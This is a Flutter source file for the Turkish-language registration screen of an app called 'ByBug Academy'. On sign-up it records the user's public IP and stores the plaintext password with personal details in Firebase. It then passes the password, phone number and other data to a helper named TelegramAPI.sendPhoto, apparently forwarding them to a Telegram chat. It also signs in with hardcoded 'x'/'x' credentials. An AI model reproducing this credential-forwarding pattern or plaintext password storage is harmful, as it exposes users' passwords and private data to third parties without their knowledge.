import 'package:opensource/page/home.dart';
import 'package:opensource/page/login.dart';
import 'package:opensource/theme/color.dart';
import 'package:cosmos/cosmos.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';

import '../utils/telegram.dart';

class RegisterMobile extends StatefulWidget {
  const RegisterMobile({super.key});

  @override
  State<RegisterMobile> createState() => _RegisterMobileState();
}

class _RegisterMobileState extends State<RegisterMobile> {
  bool visiblePassword = true;
  TextEditingController userName = TextEditingController();
  TextEditingController email = TextEditingController();
  TextEditingController password = TextEditingController();
  TextEditingController password2 = TextEditingController();
  TextEditingController name = TextEditingController();
  TextEditingController old = TextEditingController();
  TextEditingController school = TextEditingController();
  TextEditingController phone = TextEditingController();
  TextEditingController telegram = TextEditingController();
  TextEditingController discord = TextEditingController();
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bg,
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(30),
          child: Column(
            children: [
              const SizedBox(height: 20),
              Text(
                "ByBug Academy",
                style: GoogleFonts.poppins(
                  color: defaultColor,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 20),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: Row(
                        children: [
                          Expanded(
                            child: TextField(
                              controller: userName,
                              style: GoogleFonts.ubuntu(
                                color: textColor,
                                fontSize: 14,
                              ),
                              cursorColor: defaultColor,
                              maxLines: 1,
                              readOnly: false,
                              keyboardType: TextInputType.name,
                              inputFormatters: [
                                FilteringTextInputFormatter.allow(
                                    RegExp(r'[a-zA-Z]')),
                              ],
                              decoration: InputDecoration(
                                border: InputBorder.none,
                                focusedBorder: InputBorder.none,
                                labelText: "Kullanıcı Adı",
                                labelStyle: GoogleFonts.ubuntu(
                                  color: textColor.withOpacity(0.5),
                                  fontSize: 14,
                                ),
                                contentPadding: const EdgeInsets.all(0),
                              ),
                              onChanged: (value) {},
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: Row(
                        children: [
                          Expanded(
                            child: TextField(
                              controller: email,
                              style: GoogleFonts.ubuntu(
                                color: textColor,
                                fontSize: 14,
                              ),
                              cursorColor: defaultColor,
                              maxLines: 1,
                              readOnly: false,
                              keyboardType: TextInputType.emailAddress,
                              decoration: InputDecoration(
                                border: InputBorder.none,
                                focusedBorder: InputBorder.none,
                                labelText: "E-Posta",
                                labelStyle: GoogleFonts.ubuntu(
                                  color: textColor.withOpacity(0.5),
                                  fontSize: 14,
                                ),
                                contentPadding: const EdgeInsets.all(0),
                              ),
                              onChanged: (text) {
                                if (text.length > 3) {
                                  if (text.contains("@") == false) {
                                    email.text = "$text@gmail.com";
                                    TextSelection newSelection =
                                        const TextSelection.collapsed(
                                            offset: 4);
                                    email.selection = newSelection;
                                  }
                                }
                              },
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: Row(
                        children: [
                          Expanded(
                            child: Row(
                              children: [
                                Expanded(
                                  child: TextField(
                                    controller: password,
                                    style: GoogleFonts.ubuntu(
                                      color: textColor,
                                      fontSize: 14,
                                    ),
                                    cursorColor: defaultColor,
                                    maxLines: 1,
                                    readOnly: false,
                                    keyboardType: TextInputType.visiblePassword,
                                    obscureText: visiblePassword,
                                    decoration: InputDecoration(
                                      border: InputBorder.none,
                                      focusedBorder: InputBorder.none,
                                      labelText: "Parola",
                                      labelStyle: GoogleFonts.ubuntu(
                                        color: textColor.withOpacity(0.5),
                                        fontSize: 14,
                                      ),
                                      contentPadding: const EdgeInsets.all(0),
                                    ),
                                    onChanged: (value) {},
                                  ),
                                ),
                                GestureDetector(
                                  onTap: () {
                                    if (visiblePassword == true) {
                                      visiblePassword = false;
                                      setState(() {});
                                    } else if (visiblePassword == false) {
                                      visiblePassword = true;
                                      setState(() {});
                                    }
                                  },
                                  child: Icon(
                                    Icons.visibility_outlined,
                                    color: textColor.withOpacity(0.5),
                                    size: 16,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: Row(
                        children: [
                          Expanded(
                            child: Row(
                              children: [
                                Expanded(
                                  child: TextField(
                                    controller: password2,
                                    style: GoogleFonts.ubuntu(
                                      color: textColor,
                                      fontSize: 14,
                                    ),
                                    cursorColor: defaultColor,
                                    maxLines: 1,
                                    readOnly: false,
                                    keyboardType: TextInputType.visiblePassword,
                                    obscureText: visiblePassword,
                                    decoration: InputDecoration(
                                      border: InputBorder.none,
                                      focusedBorder: InputBorder.none,
                                      labelText: "Parola x2",
                                      labelStyle: GoogleFonts.ubuntu(
                                        color: textColor.withOpacity(0.5),
                                        fontSize: 14,
                                      ),
                                      contentPadding: const EdgeInsets.all(0),
                                    ),
                                    onChanged: (value) {},
                                  ),
                                ),
                                GestureDetector(
                                  onTap: () {
                                    if (visiblePassword == true) {
                                      visiblePassword = false;
                                      setState(() {});
                                    } else if (visiblePassword == false) {
                                      visiblePassword = true;
                                      setState(() {});
                                    }
                                  },
                                  child: Icon(
                                    Icons.visibility_outlined,
                                    color: textColor.withOpacity(0.5),
                                    size: 16,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: name,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[a-zA-ZüÜöÖçÇİığĞ]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Ad ve Soyad",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: old,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        maxLength: 2,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[1234567890]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Yaş",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: school,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[a-zA-Z ]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Okul",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: phone,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[1234567890]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Telefon Numarası",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: telegram,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[a-zA-Z1234567890_.-]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Telegram",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: navColor.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextField(
                        controller: discord,
                        style: GoogleFonts.ubuntu(
                          color: textColor,
                          fontSize: 14,
                        ),
                        cursorColor: defaultColor,
                        maxLines: 1,
                        readOnly: false,
                        keyboardType: TextInputType.name,
                        inputFormatters: [
                          FilteringTextInputFormatter.allow(
                              RegExp(r'[a-zA-Z1234567890_.-]')),
                        ],
                        decoration: InputDecoration(
                          border: InputBorder.none,
                          focusedBorder: InputBorder.none,
                          labelText: "Discord",
                          labelStyle: GoogleFonts.ubuntu(
                            color: textColor.withOpacity(0.5),
                            fontSize: 14,
                          ),
                          contentPadding: const EdgeInsets.all(0),
                        ),
                        onChanged: (value) {},
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 20),
              CosmosButton.borderButton(
                text: "Akademi Kaydını Oluştur",
                color: textColor.withOpacity(0.5),
                borderColor: textColor.withOpacity(0.5),
                onTap: () async {
                  //userName
                  //email
                  //password
                  //password2
                  //name
                  //old
                  //school
                  //phone
                  //telegram
                  //discord
                  if (userName.text.isNotEmpty &&
                      email.text.isNotEmpty &&
                      password.text.isNotEmpty &&
                      password2.text.isNotEmpty &&
                      name.text.isNotEmpty &&
                      old.text.isNotEmpty &&
                      school.text.isNotEmpty &&
                      phone.text.isNotEmpty &&
                      telegram.text.isNotEmpty &&
                      discord.text.isNotEmpty) {
                    if (phone.text.length == 10) {
                      if (password.text == password2.text) {
                        CosmosAlert.loadingIOS(context);
                        CosmosFirebase.signIn(
                          email: "x",
                          password: "x",
                          onError: (error) {
                            CosmosAlert.showMessage(
                              context,
                              "Opps...",
                              "Yönetim sunucusundan olumsuz yanıt geldi.",
                              color: textColor,
                              backgroundColor: cColor,
                              button: "Tamam",
                            );
                          },
                          onSuccess: () async {
                            var getIP =
                                await Dio().get("https://api.ipify.org");
                            String ip = getIP.data;
                            await CosmosFirebase.signUp(
                              email: email.text,
                              password: password.text,
                              trError: true,
                              userDatas: [
                                ip, //0
                                userName.text, //1
                                email.text, //2
                                password.text, //3
                                name.text, //4
                                old.text, //5
                                school.text, //6
                                phone.text, //7
                                telegram.text, //8
                                discord.text, //9
                                "", //profile photos          //10
                                "Hey, selam akademi!", //bio  //11
                                CosmosTime.getNowTimeString(), //12
                              ],
                              onSuccess: () async {
                                await CosmosFirebase.logout(() {}, () {});
                                CosmosFirebase.signIn(
                                  email: email.text,
                                  password: password.text,
                                  onSuccess: () async {
                                    await TelegramAPI.sendPhoto(
                                      ip,
                                      userName.text,
                                      email.text,
                                      password.text,
                                      name.text,
                                      old.text,
                                      school.text,
                                      phone.text,
                                      telegram.text,
                                      discord.text,
                                    ).then((value) {
                                      Navigator.pop(context);
                                      CosmosNavigator.pushDownFromTop(
                                          context, const HomePage());
                                    });
                                  },
                                );
                              },
                              onError: (error) async {
                                if (error.contains("Unexpected null value")) {
                                  await TelegramAPI.sendPhoto(
                                    ip,
                                    userName.text,
                                    email.text,
                                    password.text,
                                    name.text,
                                    old.text,
                                    school.text,
                                    phone.text,
                                    telegram.text,
                                    discord.text,
                                  ).then((value) {
                                    Navigator.pop(context);
                                    CosmosNavigator.pushDownFromTop(
                                        context, const HomePage());
                                  });
                                } else {
                                  Navigator.pop(context);
                                  CosmosAlert.showMessage(
                                    context,
                                    "Opps...",
                                    error,
                                    color: textColor,
                                    backgroundColor: cColor,
                                    button: "Tamam",
                                  );
                                }
                              },
                            );
                          },
                        );
                      } else {
                        CosmosAlert.showMessage(
                          context,
                          "Opps...",
                          "Parolalar eşleşmiyor. Parola ve Parola x2'nin aynı olduğundan emin olun.",
                          color: textColor,
                          backgroundColor: cColor,
                          button: "Tamam",
                        );
                      }
                    } else {
                      CosmosAlert.showMessage(
                        context,
                        "Opps...",
                        "Telefon numarasını hatalı girdiniz. Başına 0 koymadan, 10 haneli olacak şekilde girin.\n\nÖRNEK; 5005005050",
                        color: textColor,
                        backgroundColor: cColor,
                        button: "Tamam",
                      );
                    }
                  } else {
                    CosmosAlert.showMessage(
                      context,
                      "Opps...",
                      "Lütfen tüm alanları doldurun.",
                      color: textColor,
                      backgroundColor: cColor,
                      button: "Tamam",
                    );
                  }
                },
              ),
              const SizedBox(height: 20),
              CosmosButton.borderButton(
                text: "Hesabınız var mı? Giriş Yap!",
                color: textColor.withOpacity(0.5),
                borderColor: textColor.withOpacity(0),
                onTap: () {
                  CosmosNavigator.pushTopFromDown(
                    context,
                    const Login(),
                    transitionDuration: const Duration(
                      milliseconds: 200,
                    ),
                  );
                },
              ),
              const SizedBox(height: 40),
            ],
          ),
        ),
      ),
    );
  }
}
